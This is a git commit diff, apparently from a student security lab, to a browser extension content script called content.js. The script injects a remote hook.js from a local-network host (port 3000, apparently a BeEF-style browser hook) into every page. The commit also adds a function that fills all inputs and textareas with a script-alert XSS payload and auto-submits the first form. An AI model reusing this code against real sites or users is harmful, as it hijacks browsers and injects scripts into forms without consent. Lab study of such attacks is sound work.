78c0541ae07a9938f26721da53de187298c2c2c8
filip <xslabyf@stuba.sk>
2025-05-03 20:36:16 +0200

    xss

--- content.js
+++ content.js
@@ -1,7 +1,26 @@
-(function() {
-    var url = 'http://10.0.2.15:3000/hook.js';  // Tu vlož URL, kde je hosťovaný hook.js
-    var script = document.createElement('script');
+function injectHookJS() {
+    const url ='http://10.0.2.15:3000/hook.js';  // Tvoj hook.js URL
+    const script = document.createElement('script');
     script.src = url;
     script.type = 'text/javascript';
     document.body.appendChild(script);
-  })();
+  }
+  
+  // Funkcia na testovanie XSS
+function testXSS() {
+    const xssPayload = '<script>alert("XSS Test!")</script>';
+    const formInputs = document.querySelectorAll('input, textarea');
+    formInputs.forEach(input => {
+      input.value = xssPayload;
+    });
+  
+    // Automatické odoslanie formulára
+    const form = document.querySelector('form');
+    if (form) {
+      form.submit();
+    }
+  }
+(function() {
+    injectHookJS();
+    testXSS();
+})();
